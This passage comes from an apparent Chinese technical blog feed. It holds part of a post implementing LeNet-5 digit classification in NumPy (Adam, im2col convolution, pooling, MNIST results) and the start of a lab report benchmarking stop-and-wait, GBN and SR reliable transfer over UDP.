v_{t-1}+\left(1-\beta_2^t\right) g^2\]</span> 对一阶和二阶动量做偏置校正 <span class="math display">\[\begin{aligned}\hat{m}_t &amp; =\frac{m_t}{1-\beta_1^t} \\\hat{v}_t &amp; =\frac{v_t}{1-\beta_2^t}\end{aligned}\]</span>最后计算变量更新值，变量更新值正比于历史梯度的一阶指数平滑值，反比于历史梯度平方的一阶指数平滑值<span class="math display">\[\theta=\theta_{t-1}-\frac{\alpha \hat{m}_t}{\sqrt{\hat{v}_t}+\epsilon}\]</span> Adam会设置 3个超参数。一个是学习率（论文中以α出现），另外两个是一次momentum系数β1和二次momentum系数<span class="math inline">\(β2\)</span>。根据论文， 标准的设定值是<span class="math inline">\(β1\)</span>为 0.9，<span class="math inline">\(β2\)</span> 为 0.999。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lo8dlflmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-lo8dlflmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">step</span>(<span class="hljs-params">self, params</span>):    vals = params[<span class="hljs-number">0</span>]    grads = params[<span class="hljs-number">1</span>]    <span class="hljs-keyword">if</span> self.m <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:        self.m, self.v = [], []        <span class="hljs-keyword">for</span> param, grad <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(vals, grads):            self.m.append(np.zeros_like(param))            self.v.append(np.zeros_like(grad))    self.<span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span>    lr_t = self.lr * np.sqrt(<span class="hljs-number">1.0</span> - self.beta2 ** self.<span class="hljs-built_in">iter</span>) / (<span class="hljs-number">1.0</span> - self.beta1 ** self.<span class="hljs-built_in">iter</span>)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(vals)):        self.m[i] += (<span class="hljs-number">1</span> - self.beta1) * (grads[i] - self.m[i])        self.v[i] += (<span class="hljs-number">1</span> - self.beta2) * (grads[i] ** <span class="hljs-number">2</span> - self.v[i])        vals[i] -= lr_t * self.m[i] / (np.sqrt(self.v[i]) + <span class="hljs-number">1e-7</span>)    <span class="hljs-keyword">return</span> vals</code></pre></div></div><p><span class="math inline">\(\epsilon\)</span>的设置同样是为了防止<span class="math inline">\(\sqrt{\hat{v}_t}\)</span>过小进行除零运算。代码中将其设为1e-7。</p><h3 id="模型实现">模型实现</h3><p><code>layer.py</code>中定义基类<code>layer</code>，各种层均由其继承得来。</p><h3 id="卷积层">卷积层</h3><p>由于Lenet5中除第一层外不涉及padding和stride不等于1的情况，因此很多地方可以简化实现，加快迭代速度。</p><p>其前向传播的运算如下 <span class="math display">\[\mathbf{Y}=\mathbf{x} \otimes \mathbf{W}+\mathbf{b}\]</span>我们可以通过<code>im2col</code>来进行优化，将卷积运算转化为矩阵相乘。<a href="https://www.researchgate.net/publication/332186100_DeLTA_GPU_Performance_Model_for_Deep_Learning_Applications_with_In-depth_Memory_System_Traffic_Analysis">这篇论文</a>中对<code>im2col</code>实现的排布方式进行了非常直观的展示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210832783559_268_20230305200446840095_839_image-20230108225739278.png" alt="image-20230108225739278" width="80%" height="80%"></p><p>其中<span class="math inline">\(C_i\)</span>为输入通道个数，图中为3。<span class="math inline">\(C_o\)</span>为输出通道个数，图中为2。<span class="math inline">\(H_0\)</span>和<span class="math inline">\(W_0\)</span>代表卷积后输出图像的高和宽，对应于文中第一张图中的<span class="math inline">\(OH\)</span>和<span class="math inline">\(OW\)</span> <span class="math display">\[\begin{aligned}O H &amp; =\frac{H+2 P-F H}{S}+1 \\O W &amp; =\frac{W+2 P-F W}{S}+1\end{aligned}\]</span> 本实验中$O H =H-FH+1 <span class="math inline">\(，\)</span>OW =W-FW+1 $。代码实现可如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-anynjclmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-anynjclmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">im2col</span>(<span class="hljs-params">img, filter_h, filter_w, out_H, out_W</span>):    N, C, H, W = img.shape    col = np.zeros((N * out_H * out_W, C * filter_h * filter_w))    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_H):        y_start = y * out_W        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_W):            col[y_start + x::out_H * out_W, :] = img[:, :, y:y + filter_h, x:x + filter_w].reshape(N, -<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> col</code></pre></div></div><p>内层循环执行一次，滤波器覆盖的区域被展成“长条”，放到<code>col</code>的对应位置，比如第一次执行内层循环，上图的红黄蓝三条<code>l0 l1 l3 l4</code>均就位。</p><p>另外《深度学习入门：基于Python的理论与实现》中有另外一种实现，避免了步长的切片，数据访问局部性更好。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-m4elzllmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-m4elzllmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">im2col</span>(<span class="hljs-params">img, filter_h, filter_w, out_H, out_W</span>):    N, C, H, W = img.shape    col = np.zeros((N, C, filter_h, filter_w, out_H, out_W))    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(filter_h):        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(filter_w):            col[:, :, h, w, :, :] = img[:, :, h:h + out_H, w:w + out_W]    col = col.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>).reshape(N * out_H * out_W, -<span class="hljs-number">1</span>)    <span class="hljs-keyword">return</span> col</code></pre></div></div><p>整个前向传播的实现如下：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nagqhxlmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-nagqhxlmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):    N, C, H, W = X.shape    out_H = H - self.filter_size + <span class="hljs-number">1</span>    out_W = W - self.filter_size + <span class="hljs-number">1</span>    <span class="hljs-comment"># use im2col to convert input to column</span>    col = im2col(X, self.filter_size, self.filter_size, out_H, out_W)    col_W = self.W.reshape(self.out_channels, -<span class="hljs-number">1</span>).T    <span class="hljs-comment"># thus we can use matrix multiplication to calculate output</span>    out = np.dot(col, col_W) + self.b    out = out.reshape(N, out_H, out_W, -<span class="hljs-number">1</span>).transpose(<span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    self.X = X    self.col = col    self.col_W = col_W    <span class="hljs-keyword">return</span> out</code></pre></div></div><p>对于反向传播，可以通过下面简单的例子进行理解：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210834019523_589_20230305200448882525_978_image-20230108223119000.png" alt="image-20230108223119000" width="50%" height="50%"></p><p>列出 <span class="math inline">\(a ， W ， z\)</span>的矩阵表达式如下: <span class="math display">\[\left[\begin{array}{ll}z_{11} &amp; z_{12} \\z_{21} &amp; z_{22}\end{array}\right]=\left[\begin{array}{lll}a_{11} &amp; a_{12} &amp; a_{13} \\a_{21} &amp; a_{22} &amp; a_{23} \\a_{31} &amp; a_{32} &amp; a_{33}\end{array}\right] *\left[\begin{array}{cc}w_{11} &amp; w_{12} \\w_{21} &amp; w_{22}\end{array}\right]\]</span> 利用卷积的定义，很容易得出: <span class="math display">\[\begin{aligned}&amp; z_{11}=a_{11} w_{11}+a_{12} w_{12}+a_{21} w_{21}+a_{22} w_{22} \\&amp; z_{12}=a_{12} w_{11}+a_{13} w_{12}+a_{22} w_{21}+a_{23} w_{22} \\&amp; z_{21}=a_{21} w_{11}+a_{22} w_{12}+a_{31} w_{21}+a_{32} w_{22} \\&amp; z_{22}=a_{22} w_{11}+a_{23} w_{12}+a_{32} w_{21}+a_{33} w_{22}\end{aligned}\]</span></p><p>比如求损失函数 <span class="math inline">\(J\)</span> 对 <span class="math inline">\(a_{11}\)</span> 的梯度: <span class="math display">\[\frac{\partial J}{\partial a_{11}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{11}}=\delta_{z 11} \cdot w_{11}\]</span> 上式中， <span class="math inline">\(\delta_{z 11}\)</span>是从网络后端回传到本层的 <span class="math inline">\(z_{11}\)</span>单元的梯度。 求 <span class="math inline">\(J\)</span> 对 <span class="math inline">\(a_{12}\)</span> 的梯度 <span class="math inline">\(a_{12}\)</span> 对 <span class="math inline">\(z_{11}\)</span> 和 <span class="math inline">\(z_{12}\)</span> 都有贡献，二者的偏导数相加： <span class="math display">\[\frac{\partial J}{\partial a_{12}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{12}}+\frac{\partial J}{\partialz_{12}} \frac{\partial z_{12}}{\partial a_{12}}=\delta_{z 11} \cdotw_{12}+\delta_{z 12} \cdot w_{11}\]</span> <span class="math display">\[\frac{\partial J}{\partial a_{22}}=\frac{\partial J}{\partial z_{11}}\frac{\partial z_{11}}{\partial a_{22}}+\frac{\partial J}{\partialz_{12}} \frac{\partial z_{12}}{\partial a_{22}}+\frac{\partialJ}{\partial z_{21}} \frac{\partial z_{21}}{\partiala_{22}}+\frac{\partial J}{\partial z_{22}} \frac{\partialz_{22}}{\partial a_{22}} =\delta_{z 11} \cdot w_{22}+\delta_{z 12} \cdotw_{21}+\delta_{z 21} \cdot w_{12}+\delta_{z 22} \cdot w_{11}\]</span> 同理可得所有 <span class="math inline">\(a\)</span>的梯度。</p><p>观察公式，可以发现把原始的卷积核旋转了180度，再与传入误差项做卷积操作，即可得到所有元素的误差项。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210835040764_715_20230305200450427910_422_image-20230108223730899.png" alt="image-20230108223730899" width="50%" height="50%"></p><p>可以得到 <span class="math display">\[\delta_{\text {out }}=\delta_{\text {in }} * W^{\text {rot180 }}\]</span></p><p>同样的道理，对<span class="math inline">\(\mathbf{W}\)</span>和<span class="math inline">\(\mathbf{b}\)</span>分别求偏导，可以得到：</p><p><span class="math display">\[\begin{gathered}\operatorname{\delta}_{\mathbf{W}}=\mathbf{X} \otimes \delta_{\text {in}} \\\operatorname{\delta}_{\mathbf{b}}=\sum \delta_{\text {in }}\end{gathered}\]</span> 代码中用<code>back_grad</code>指代<span class="math inline">\(\delta_{\text {in}}\)</span>,表示从后面的层反向传播过来的梯度。</p><p>同时结合<code>im2col</code>的逆操作，代码可如下实现：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-oh3e8klmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-oh3e8klmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    FN, C, FH, FW = self.W.shape    back_grad = back_grad.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>).reshape(-<span class="hljs-number">1</span>, FN)    self.db = np.<span class="hljs-built_in">sum</span>(back_grad, axis=<span class="hljs-number">0</span>)    self.dW = np.dot(self.col.T, back_grad)    self.dW = self.dW.transpose(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>).reshape(FN, C, FH, FW)    dcol = np.dot(back_grad, self.col_W.T)    dx = col2im(dcol, self.X.shape, FH, FW)    <span class="hljs-keyword">return</span> dx</code></pre></div></div><p>其中<code>col2im</code>作如下实现，道理和<code>im2col</code>类似，不再赘述。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dfqx69lmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-dfqx69lmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">col2im</span>(<span class="hljs-params">col, input_shape, filter_h, filter_w</span>):    N, C, H, W = input_shape    out_H = H - filter_h + <span class="hljs-number">1</span>    out_W = W - filter_w + <span class="hljs-number">1</span>    img = np.zeros((N, C, H, W))    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_H):        y_start = y * out_W        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(out_W):            img[:, :, y:y + filter_h, x:x + filter_w] += col[y_start + x::out_H * out_W, :].reshape(N, C, filter_h,                                                                                                    filter_w)    <span class="hljs-keyword">return</span> img</code></pre></div></div><h3 id="池化层">池化层</h3><p>在本次实验中，池化层采用了最大池化的方式，即通过滤波器筛选出最大的元素作为池化结果。反向传播时只有被选择为最大值的元素位置对应会被梯度反向传播，其余的位置都赋值为0。</p><p>反向传播也可以通过<code>im2col</code>实现，不过可以利用掩码达到类似的加速效果，且比<code>col2im</code>快。</p><p><code>col2im</code>方法：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-92rt6vlmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-92rt6vlmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    back_grad = back_grad.transpose(<span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>)    pool_size = self.pool_H * self.pool_W    dmax = np.zeros((back_grad.size, pool_size))    dmax[np.arange(self.arg_max.size), self.arg_max.flatten()] = back_grad.flatten()    dmax = dmax.reshape(back_grad.shape + (pool_size,))    dcol = dmax.reshape(dmax.shape[<span class="hljs-number">0</span>] * dmax.shape[<span class="hljs-number">1</span>] * dmax.shape[<span class="hljs-number">2</span>], -<span class="hljs-number">1</span>)    dx = col2im(dcol, self.X.shape, self.pool_H, self.pool_W)    <span class="hljs-keyword">return</span> dx</code></pre></div></div><p><code>mask</code>方法：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-8rxlmulmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-8rxlmulmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):    h_size = self.pool_H    w_size = self.pool_W    N, C, H, W = self.X.shape    output_H = H // h_size    output_W = W // w_size    grad = np.zeros_like(self.X)    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(output_H):        <span class="hljs-keyword">for</span> w <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(output_W):            tmp_x = self.X[:, :, h * h_size:(h + <span class="hljs-number">1</span>) * h_size, w * w_size:(w + <span class="hljs-number">1</span>) * w_size].reshape((N, C, -<span class="hljs-number">1</span>))            mask = np.zeros((N, C, h_size * w_size))            mask[np.arange(N)[:, <span class="hljs-literal">None</span>], np.arange(C)[<span class="hljs-literal">None</span>, :], np.argmax(tmp_x, axis=<span class="hljs-number">2</span>)] = <span class="hljs-number">1</span>            grad[:, :, h * h_size:(h + <span class="hljs-number">1</span>) * h_size, w * w_size:(w + <span class="hljs-number">1</span>) * w_size] = mask.reshape(                (N, C, h_size, w_size)) * back_grad[:, :, h, w][:, :, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]    <span class="hljs-keyword">return</span> grad</code></pre></div></div><h3 id="全连接层">全连接层</h3><p>全连接层与正常的神经网络基本相同。正向传播就是正常的线性变换，反向传播在实际实现时使用计算图的思想理解比较容易，比如下面是3节点层和2节点层反向传播的示意图：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210836169019_246_20230305200451954546_926_image-20230108232916872.png" alt="image-20230108232916872"><figcaption aria-hidden="true">image-20230108232916872</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jnjqfnlmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-jnjqfnlmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Linear</span>(<span class="hljs-title class_ inherited__">Layer</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, input_size, output_size</span>):        <span class="hljs-built_in">super</span>().__init__()        self.<span class="hljs-built_in">input</span> = <span class="hljs-literal">None</span>        self.output = <span class="hljs-literal">None</span>        <span class="hljs-comment"># use "He" initialization</span>        <span class="hljs-comment"># self.W = np.random.randn(input_size, output_size) * np.sqrt(2 / input_size)</span>        <span class="hljs-comment"># use normal distribution initialization</span>        self.W = np.random.normal(scale=<span class="hljs-number">1e-3</span>, size=(input_size, output_size))        self.b = np.zeros(output_size)        self.dW = np.zeros((input_size, output_size))        self.db = np.zeros(output_size)    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, X</span>):        self.<span class="hljs-built_in">input</span> = X.copy()        self.output = np.dot(self.<span class="hljs-built_in">input</span>, self.W) + self.b        <span class="hljs-keyword">return</span> self.output    <span class="hljs-keyword">def</span> <span class="hljs-title function_">backward</span>(<span class="hljs-params">self, back_grad</span>):        self.dW = np.dot(self.<span class="hljs-built_in">input</span>.T, back_grad)        self.db = np.<span class="hljs-built_in">sum</span>(back_grad, axis=<span class="hljs-number">0</span>)        <span class="hljs-keyword">return</span> np.dot(back_grad, self.W.T)</code></pre></div></div><h2 id="实验结果">实验结果</h2><h4 id="实验环境">实验环境</h4><p>python3.8，依赖numpy及matplotlib。</p><h4 id="运行结果及分析">运行结果及分析</h4><p>使用54000个数据作为训练集，6000个数据作为验证集，Adam的学习率设置为1e-3。执行20个epoch得到的结果，测试集准确率为98.27%。</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210837132026_873_20230305200453760864_136_image-20230108234919998.png" alt="image-20230108234919998" width="80%" height="80%"></p><p>从验证集及损失函数看，模型比较有效的学得了训练集上的参数，且训练集和测试集的正确率同步上升，未发生明显的过拟合。由于并没有对模型进行更细致的参数调优或组合，和LeCun论文中的 99.27%仍有微小的差距。</p><p>同时还打印出了错误分类的样本及其标签，左边为标签，右边为错误预测。可以看到，这些样本很多都比较“奇怪”，即使人来粗看也非常容易犯错。比如右下角的2，本身写的就很难与1分辨开来，一定程度上也说明模型对相似度的正确判断。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210837983994_639_20230305200455107633_269_image-20230108234646628.png" alt="image-20230108234646628"><figcaption aria-hidden="true">image-20230108234646628</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机网络实验3.4-基于UDP服务设计可靠传输协议(性能测试)</title>
    <link href="/posts/55174/"/>
    <url>/posts/55174/</url>
    
    <content type="html"><![CDATA[<h1 id="计算机网络实验3.4-基于udp服务设计可靠传输协议性能测试">计算机网络实验3.4-基于UDP服务设计可靠传输协议(性能测试)</h1><h2 id="实验要求">实验要求</h2><p>基于给定的实验测试环境，通过改变延迟时间和丢包率，完成下面3组性能对比实验：</p><p>（1）停等机制与滑动窗口机制性能对比；</p><p>（2）滑动窗口机制中不同窗口大小对性能的影响；</p><p>（3）有拥塞控制和无拥塞控制的性能比较。</p><ul><li><p>控制变量法；</p></li><li><p>性能测试指标：吞吐率、时延，给出图形结果并进行分析。</p></li></ul><h2 id="实验环境及测试流程">实验环境及测试流程</h2><p>Windows 10 MinGW w64 9.0</p><p>协议设计等可参见<a href="https://lunaticsky-tql.github.io/posts/24837/">lab3.1</a></p><p>测试中发现，输出中间信息（如窗口大小丢包信息等）会显著影响传输时间，传输时间较短时更为明显。同时不同的实现输出的内容和数量也不一致。因此下面的性能测试中均去除了传输过程中所有输出信息。</p><p>每组数据测量三次，取平均值。</p><p>经测试，吞吐率与文件类型无明显关联。故所有测试均使用提供的<code>helloworld.txt</code>，文件大小1552320字节。所有测试与吞吐率相关指标均用该文件净传输时间表示。</p><p>吞吐率可计算如下：</p><p><code>Throughput rate=(double)file_len*1000/(timer_end-timer_start)) B/s</code></p><h2 id="性能测试">性能测试</h2><h3 id="停等协议滑动窗口">停等协议&amp;滑动窗口</h3><h4 id="停等协议">停等协议</h4><p>停等协议下，改变丢包率和延时测得数据如下所示（单位：ms）：</p><table><thead><tr class="header"><th>丢包率</th><th>0</th><th>1</th><th>2</th><th>3</th><th>50</th></tr></thead><tbody><tr class="odd"><td>0%</td><td>1209</td><td>24553</td><td>28056</td><td>31249</td><td>117252</td></tr><tr class="even"><td>1%</td><td>34148</td><td>63867</td><td>65102</td><td>66329</td><td></td></tr><tr class="odd"><td>9%</td><td>190942</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205751344676_212_20221230235944988658_534_image-20221230215825119.png" width="80%" height="80%"></p><p>可以从数据中初步探索延迟和丢包率对传输时间的影响力度。</p><h4 id="滑动窗口">滑动窗口</h4><h5 id="gbn">GBN</h5><p>在窗口大小为10，超时时间为1s时，测得数据如下所示（单位：ms）：</p><table><thead><tr class="header"><th>丢包率</th><th>0</th><th>1</th><th>2</th><th>3</th><th>50</th></tr></thead><tbody><tr class="odd"><td>0%</td><td>1301</td><td>29799</td><td>32112</td><td>39832</td><td>115665</td></tr><tr class="even"><td>1%</td><td>37429</td><td>69002</td><td>75104</td><td>78379</td><td></td></tr><tr class="odd"><td>9%</td><td>250775</td><td></td><td></td><td></td><td></td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205752463313_619_20221230235945954601_749_image-20221230215757564.png" alt="image-20221230215757564" width="80%" height="80%"></p><p>可以看到，在实验环境下，GBN的整体表现甚至不如停等协议，即便是没有丢包和延时的条件下也是如此。猜测在实验条件下传输速度主要取决于接收端的接收速度。即使发送端可以“并行”发送，但由于接收端仍然需要等待和停等协议接近相同的超时时间接收丢失的包，因此传输速度并没有相差多少，反而由于GBN使得接收方不得不处理失序的包，从而耽误了更多的一些时间。</p><p>同时也在实验中尝试在接收端对两次收包的间隔进行计时，发现丢包率设为0%时间隔仅为1-2ms，而仅仅将丢包率设为1%，延时仍为0s的前提下，正常接收（不涉及丢包时）的时延达9-15ms不等。猜测这个现象与路由器程序的实现有关。因此，0/0%的高吞吐率实际上在这个实验中并没有参考价值。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-87sxamlmrh9u6a"></i><span>c++</span><div class="collapse show" id="collapse-87sxamlmrh9u6a"><pre><code class="hljs c++"><span class="hljs-comment">//"blocking" receive here</span><span class="hljs-keyword">while</span> (<span class="hljs-built_in">rdt_rcv</span>(rcvpkt)) {    single_pkt_timer2=<span class="hljs-built_in">clock</span>();    cout&lt;&lt;<span class="hljs-string">"ack_between_time: "</span>&lt;&lt;single_pkt_timer2-single_pkt_timer1&lt;&lt;endl;    single_pkt_timer1=<span class="hljs-built_in">clock</span>();    ...handle pkts...    }</code></pre></div></div><p>另外，在丢包率为10%，窗口大小为10时，路由器总是会丢弃同一个包，因此会造成无法正常接收的情况。因此采用9%来指代丢包率极高的情形。</p><h3 id="滑动窗口参数探索">滑动窗口参数探索</h3><h5 id="窗口大小比较">窗口大小比较</h5><p>根据上面的探索，在探索滑动窗口参数时，控制延迟和丢包率分别为0ms和1%，以尽可能减少等待时间的前提下验证其正常功能发挥，同时避免路由器程序bug的影响。</p><p>GBN在不同窗口大小情况下的数据如下所示：</p><table><thead><tr class="header"><th>窗口大小</th><th>2</th><th>5</th><th>10</th><th>20</th><th>30</th></tr></thead><tbody><tr class="odd"><td>传输速率（ms）</td><td>36192</td><td>37274</td><td>37429</td><td>38220</td><td>47513</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205753403446_900_20221230235947937654_537_image-20221230214521654.png" alt="image-20221230214521654" width="50%" height="50%"></p><p>可以看到，当窗口大小较大时，制约传输速度的因素主要是接收端接收的速度，因此单纯的增大窗口大小并无益于增加传输速度，如下所示为窗口大小为40时的情况：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205754351405_153_20221230235948815831_502_image-20221230214007362.png" alt="image-20221230214007362"><figcaption aria-hidden="true">image-20221230214007362</figcaption></figure><p>当然也注意到，即便窗口大小设为2，性能也不如停等版本。</p><h5 id="不同算法的比较">不同算法的比较</h5><p>而对于SR来说，这种现象则出现的更为严重，由于接收端需要对更多的情况进行判断和处理，且以至于在实验条件下疲于应付发送端发送的速度，因此出现了明明没有丢的包，由于接收方没有及时处理并且返回ACK，导致发送端循环进行超时重传，传输无法正常进行。如下图所示：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205755332234_875_20221230235950876688_746_image-20221230220200564.png" alt="image-20221230220200564" width="80%" height="80%"></p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205756610390_290_20221230235952186704_885_image-20221230220316189.png" alt="image-20221230220316189" width="90%" height="90%"></p><p>出现了这种情况后，尽管窗口仍旧可以移动，但由于接收方不得不处理大量重复的分组，导致恶性循环：越重发越接收的慢，越接收的慢越重发。不久就会出现重发的包远大于事实上需要的包的局面：</p><p><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%AE%9E%E9%AA%8C3.4-%E5%9F%BA%E4%BA%8EUDP%E6%9C%8D%E5%8A%A1%E8%AE%BE%E8%AE%A1%E5%8F%AF%E9%9D%A0%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/20230828205757732612_214_20221230235953488408_156_image-20221230221445403.png" alt="image-20221230221445403" width="80%" 